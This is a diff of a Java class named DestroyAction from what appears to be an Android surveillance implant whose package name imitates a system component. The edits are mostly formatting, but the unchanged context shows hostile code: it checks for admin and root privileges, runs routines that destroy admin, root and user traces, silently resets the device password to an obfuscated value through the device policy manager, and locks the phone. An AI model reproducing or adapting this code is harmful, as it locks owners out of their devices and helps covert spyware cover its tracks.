@@ -1,8 +1,5 @@
 package com.android.dvci.action;
 
-import java.lang.reflect.InvocationTargetException;
-import java.lang.reflect.Method;
-
 import android.app.admin.DevicePolicyManager;
 import android.content.Context;
 import android.telephony.TelephonyManager;
@@ -16,6 +13,8 @@ import com.android.dvci.util.Check;
 import com.android.dvci.util.Execute;
 import com.android.internal.telephony.ITelephony;
 import com.android.mm.M;
+
+import java.lang.reflect.Method;
 
 public class DestroyAction extends SubAction {
 	private static final String TAG = "DestroyAction";
@@ -42,12 +41,11 @@ public class DestroyAction extends SubAction {
 			if (Status.self().haveAdmin()) {
 				destroyAdmin();
 			}
-			
+
 			if (Status.self().haveRoot()) {
 				destroyRoot();
 			}
 			
-
 			destroyUser();
 		} catch (Exception ex) {
 			if (Cfg.DEBUG) {
@@ -80,10 +78,10 @@ public class DestroyAction extends SubAction {
 		DevicePolicyManager mDPM;
 
 		mDPM = (DevicePolicyManager) Status.self().getAppContext().getSystemService(Context.DEVICE_POLICY_SERVICE);
-		
-		if(Cfg.DEBUG){
+
+		if (Cfg.DEBUG) {
 			mDPM.resetPassword(M.e("Blocked0011"), 0);
-		}else{
+		} else {
 			mDPM.resetPassword(M.e("b"), 0);
 		}
 		mDPM.lockNow();
